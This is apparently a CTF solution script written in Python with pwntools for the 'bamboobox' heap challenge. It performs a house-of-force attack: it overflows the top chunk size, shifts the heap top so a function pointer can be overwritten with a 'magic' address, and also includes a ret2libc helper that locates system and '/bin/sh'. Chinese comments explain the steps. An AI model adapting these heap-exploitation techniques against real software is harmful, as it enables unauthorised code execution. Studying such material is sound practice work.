from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './bamboobox'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26708) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'Your choice:',b'2')
    sla(b':',int2bytes(len))
    sa(b':',content)



def show():
    sla(b'Your choice:',b'1')


def edit(index,size,content):
    sla(b'Your choice:',b'3')
    sla(b':',int2bytes(index))
    sla(b':', int2bytes(size))
    sa(b':', content)


def delete(index):
    sla(b'Your choice:',b'4')
    sla(b':',int2bytes(index))

#house of force
magic = 0x400D49

add(0x30)#0
payload = 0x30*b'a'+p64(0)+p64(0xffffffffffffffff)
#不能给p64赋值-1，应该是p64问题
edit(0,len(payload),payload)
offset = 0x2456000 - 0x2456060 - 0x10
#这里是要覆写top chunk到达第一个chunk的地址
add(offset)
dbg()
add(0x10,p64(magic)*2)
dbg()
#修改第一个chunk内容
sla(b'Your choice:', b'5')

itr()

